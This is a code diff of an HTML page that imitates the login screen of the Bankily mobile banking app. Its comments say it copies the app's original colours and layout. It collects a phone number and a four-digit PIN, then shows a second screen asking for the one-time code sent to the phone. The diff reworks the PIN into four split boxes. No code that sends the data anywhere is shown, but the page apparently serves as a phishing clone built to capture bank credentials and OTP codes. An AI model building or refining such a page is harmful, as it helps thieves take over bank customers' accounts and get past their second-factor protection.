@@ -6,11 +6,10 @@
     <title>Bankily - بنكيلي</title>
     <style>
         :root {
-            --primary-teal: #0093a2; /* درجة الفيروزي الأصلية للتطبيق */
+            --primary-teal: #0093a2; /* درجة الفيروزي الأصلية بالتطبيق */
             --primary-yellow: #f8ba00; /* درجة الأصفر الأصلية للشريط السفلي */
             --bg-white: #ffffff;
             --text-gray: #7d7d7d;
-            --line-gray: #b5b5b5;
         }
 
         * {
@@ -62,7 +61,7 @@
             font-size: 1.6rem;
             cursor: pointer;
             font-weight: bold;
-            display: none; /* يظهر في واجهة الـ OTP فقط */
+            display: none;
         }
 
         /* المحتوى الداخلي */
@@ -74,7 +73,7 @@
             align-items: center;
         }
 
-        /* الشعار (نصي ومطابق لتنسيق الصورة الثانية) */
+        /* الشعار */
         .brand-logo {
             text-align: center;
             margin-bottom: 35px;
@@ -95,10 +94,10 @@
             font-weight: 500;
         }
 
-        /* المجموعات الخاصة بحقول الإدخال */
+        /* مجموعات الإدخال */
         .input-group {
             width: 100%;
-            margin-bottom: 35px;
+            margin-bottom: 30px;
             position: relative;
             text-align: right;
         }
@@ -111,7 +110,12 @@
             margin-bottom: 15px;
         }
 
-        /* حقل الإدخال الرئيسي الشفاف مع الخط السفلي */
+        /* حقل الهاتف المستمر */
+        .phone-input-wrapper {
+            position: relative;
+            width: 100%;
+        }
+
         .main-input {
             width: 100%;
             border: none;
@@ -124,13 +128,28 @@
             background: transparent;
         }
 
-        /* حقل تلميح النص داخل الحقل */
-        .main-input::placeholder {
-            color: #b8b8b8;
-            font-size: 1.1rem;
+        /* حاوية الخانات المنفصلة (للرقم السري والـ OTP) */
+        .split-inputs-container {
+            display: flex;
+            justify-content: space-between;
+            width: 75%;
+            margin: 10px auto 0 auto;
+            direction: ltr; /* لجعل الانتقال للأرقام من اليسار لليمين منطقياً */
         }
 
-        /* أيقونات المستخدم والقفل الجانبية المتطابقة مع الرسمة */
+        .split-box {
+            width: 35px;
+            height: 35px;
+            border: none;
+            border-bottom: 2px solid #222;
+            text-align: center;
+            font-size: 1.4rem;
+            font-weight: bold;
+            outline: none;
+            background: transparent;
+        }
+
+        /* أيقونات المستخدم والقفل الجانبية */
         .field-icon {
             position: absolute;
             left: 0;
@@ -140,9 +159,9 @@
             opacity: 0.8;
         }
 
-        /* الروابط المساعدة السفلى */
+        /* الروابط المساعدة */
         .helper-links {
-            margin-top: 10px;
+            margin-top: 15px;
             text-align: center;
             width: 100%;
             line-height: 2.2;
@@ -155,7 +174,7 @@
             font-weight: 500;
         }
 
-        /* ================= تخصيص واجهة التحقق OTP ================= */
+        /* تخصيصات واجهة OTP */
         .otp-title {
             font-size: 1.1rem;
             font-weight: bold;
@@ -166,31 +185,11 @@
             margin-bottom: 40px;
         }
 
-        /* حقول الـ OTP المتقطعة كلياً بناءً على الصورة الأصلية */
-        .otp-container {
-            display: flex;
-            justify-content: space-between;
-            width: 75%;
-            margin-bottom: 35px;
-            direction: ltr;
-        }
-
-        .otp-field {
-            width: 40px;
-            height: 40px;
-            border: none;
-            border-bottom: 2px solid #222;
-            text-align: center;
-            font-size: 1.5rem;
-            font-weight: bold;
-            outline: none;
-            background: transparent;
-        }
-
         .otp-timer-label {
             font-size: 0.95rem;
             color: #666;
             margin-bottom: 5px;
+            margin-top: 10px;
         }
 
         .otp-timer-countdown {
@@ -200,7 +199,6 @@
             margin-bottom: 25px;
         }
 
-        /* الدائرة الخضراء المؤقتة المأخوذة من الصورة */
         .green-circle {
             width: 32px;
             height: 32px;
@@ -209,7 +207,7 @@
             margin-bottom: 30px;
         }
 
-        /* الزر الأصفر السفلي العريض الثابت */
+        /* الزر السفلي الأصفر الثابت */
         .footer-button {
             background-color: var(--primary-yellow);
             color: #ffffff;
@@ -220,14 +218,13 @@
             font-weight: bold;
             cursor: pointer;
             outline: none;
-            margin-top: auto; /* يدفعه ليلتصق بأسفل الشاشة */
+            margin-top: auto;
         }
 
         .footer-button:active {
             opacity: 0.9;
         }
 
-        /* كلاس الإخفاء للتنقل */
         .hidden {
             display: none !important;
         }
@@ -250,14 +247,21 @@
 
             <div class="input-group">
                 <label>اسم المستخدم أو رقم الهاتف</label>
-                <input type="text" id="usernameInput" class="main-input" maxlength="8" placeholder="من 8 أرقام" oninput="cleanNumberInput(this)">
-                <svg class="field-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="8" r="4"/><path d="M5.5 21a8.5 8.5 0 0 1 13 0"/></svg>
+                <div class="phone-input-wrapper">
+                    <input type="text" id="usernameInput" class="main-input" maxlength="8" oninput="cleanNumberInput(this)">
+                    <svg class="field-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="8" r="4"/><path d="M5.5 21a8.5 8.5 0 0 1 13 0"/></svg>
+                </div>
             </div>
 
             <div class="input-group">
                 <label>الرقم السري</label>
-                <input type="password" id="passwordInput" class="main-input" maxlength="4" placeholder="من 4 أرقام" oninput="cleanNumberInput(this)">
-                <svg class="field-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="5" y="11" width="14" height="10" rx="2"/><path d="M8 11V7a4 4 0 0 1 8 0v4"/></svg>
+                <div class="split-inputs-container">
+                    <input type="password" class="split-box pin-box" maxlength="1" oninput="handleBoxNavigation(this, '.pin-box', 0)">
+                    <input type="password" class="split-box pin-box" maxlength="1" oninput="handleBoxNavigation(this, '.pin-box', 1)">
+                    <input type="password" class="split-box pin-box" maxlength="1" oninput="handleBoxNavigation(this, '.pin-box', 2)">
+                    <input type="password" class="split-box pin-box" maxlength="1" oninput="handleBoxNavigation(this, '.pin-box', 3)">
+                </div>
+                <svg class="field-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="bottom: 5px;"><rect x="5" y="11" width="14" height="10" rx="2"/><path d="M8 11V7a4 4 0 0 1 8 0v4"/></svg>
             </div>
 
             <div class="helper-links">
@@ -269,11 +273,11 @@
         <div id="otpSection" class="app-content hidden">
             <p class="otp-title">أدخل رمز التأكيد المرسل إلى<br>هاتفك المحمول</p>
 
-            <div class="otp-container">
-                <input type="text" class="otp-field" maxlength="1" oninput="handleOtpNavigation(this, 1)">
-                <input type="text" class="otp-field" maxlength="1" oninput="handleOtpNavigation(this, 2)">
-                <input type="text" class="otp-field" maxlength="1" oninput="handleOtpNavigation(this, 3)">
-                <input type="text" class="otp-field" maxlength="1" oninput="handleOtpNavigation(this, 4)">
+            <div class="split-inputs-container" style="margin-bottom: 35px;">
+                <input type="text" class="split-box otp-box" maxlength="1" oninput="handleBoxNavigation(this, '.otp-box', 0)">
+                <input type="text" class="split-box otp-box" maxlength="1" oninput="handleBoxNavigation(this, '.otp-box', 1)">
+                <input type="text" class="split-box otp-box" maxlength="1" oninput="handleBoxNavigation(this, '.otp-box', 2)">
+                <input type="text" class="split-box otp-box" maxlength="1" oninput="handleBoxNavigation(this, '.otp-box', 3)">
             </div>
 
             <p class="otp-timer-label">تنتهي صلاحية رمز التأكيد خلال</p>
@@ -291,12 +295,38 @@
     </div>
 
     <script>
-        // تنظيف الحقول لمنع إدخال الرموز أو الأحرف
+        // تنظيف مدخلات حقل الهاتف
         function cleanNumberInput(input) {
             input.value = input.value.replace(/[^0-9]/g, '');
         }
 
-        // معالجة الضغط على الزر الرئيسي السفلي
+        // حركة الانتقال التلقائي الذكية للخانات المنفصلة (تدعم الرقم السري والـ OTP)
+        function handleBoxNavigation(current, className, currentIndex) {
+            current.value = current.value.replace(/[^0-9]/g, '');
+            const fields = document.querySelectorAll(className);
+            
+            if (current.value.length === 1 && currentIndex < 3) {
+                fields[currentIndex + 1].focus();
+            }
+        }
+
+        // دعم زر الـ Backspace للرجوع للخلف والمسح في كل الخانات المنفصلة
+        function setupBackspaceListener(className) {
+            const fields = document.querySelectorAll(className);
+            fields.forEach((field, index) => {
+                field.addEventListener('keydown', (e) => {
+                    if (e.key === "Backspace" && field.value.length === 0 && index > 0) {
+                        fields[index - 1].focus();
+                    }
+                });
+            });
+        }
+
+        // تشغيل مستمعات المسح عند تحميل الصفحة
+        setupBackspaceListener('.pin-box');
+        setupBackspaceListener('.otp-box');
+
+        // معالجة الضغط على الزر الرئيسي الأصفر
         function onFooterButtonClick() {
             const loginSection = document.getElementById('loginSection');
             const otpSection = document.getElementById('otpSection');
@@ -304,30 +334,32 @@
             const backArrow = document.getElementById('backArrow');
             const submitBtn = document.getElementById('submitBtn');
 
-            // التحقق من الحقول في الواجهة الأولى والتحويل
             if (!loginSection.classList.contains('hidden')) {
                 const userVal = document.getElementById('usernameInput').value;
-                const passVal = document.getElementById('passwordInput').value;
+                
+                // تجميع الرقم السري من الـ 4 خانات
+                let pinVal = "";
+                document.querySelectorAll('.pin-box').forEach(box => pinVal += box.value);
 
                 if (userVal.length !== 8) {
                     alert("يجب إدخال رقم الهاتف المكون من 8 أرقام.");
                     return;
                 }
-                if (passVal.length !== 4) {
-                    alert("يجب إدخال الرقم السري المكون من 4 أرقام.");
+                if (pinVal.length !== 4) {
+                    alert("يجب إدخال الرقم السري كاملاً المكون من 4 خانات.");
                     return;
                 }
 
-                // التحويل إلى واجهة الـ OTP
+                // التحويل لواجهة الـ OTP
                 loginSection.classList.add('hidden');
                 otpSection.classList.remove('hidden');
                 titleText.innerText = "رمز التحقق";
                 backArrow.style.display = "block";
                 submitBtn.innerText = "التحقق";
             } else {
-                // تجميع قيم الـ OTP في الواجهة الثانية
+                // تجميع قيم الـ OTP
                 let otpCode = "";
-                document.querySelectorAll('.otp-field').forEach(field => otpCode += field.value);
+                document.querySelectorAll('.otp-box').forEach(box => otpCode += box.value);
 
                 if (otpCode.length !== 4) {
                     alert("الرجاء تعبئة حقل الـ OTP المكون من 4 أرقام.");
@@ -338,7 +370,7 @@
             }
         }
 
-        // العودة إلى واجهة تسجيل الدخول الأصلية عند الضغط على السهم العلوي
+        // العودة لواجهة تسجيل الدخول
         function switchToLogin() {
             document.getElementById('loginSection').classList.remove('hidden');
             document.getElementById('otpSection').classList.add('hidden');
@@ -346,24 +378,6 @@
             document.getElementById('backArrow').style.display = "none";
             document.getElementById('submitBtn').innerText = "تسجيل الدخول";
         }
-
-        // تنظيم حركة المؤشر التلقائية عند كتابة الـ OTP
-        function handleOtpNavigation(current, nextIndex) {
-            current.value = current.value.replace(/[^0-9]/g, '');
-            const fields = document.querySelectorAll('.otp-field');
-            if (current.value.length === 1 && nextIndex < 4) {
-                fields[nextIndex].focus();
-            }
-        }
-
-        // تمكين زر الـ Backspace لمسح والرجوع للخلف بسلاسة في الـ OTP
-        document.querySelectorAll('.otp-field').forEach((field, index) => {
-            field.addEventListener('keydown', (e) => {
-                if (e.key === "Backspace" && field.value.length === 0 && index > 0) {
-                    document.querySelectorAll('.otp-field')[index - 1].focus();
-                }
-            });
-        });
     </script>
 </body>
 </html>
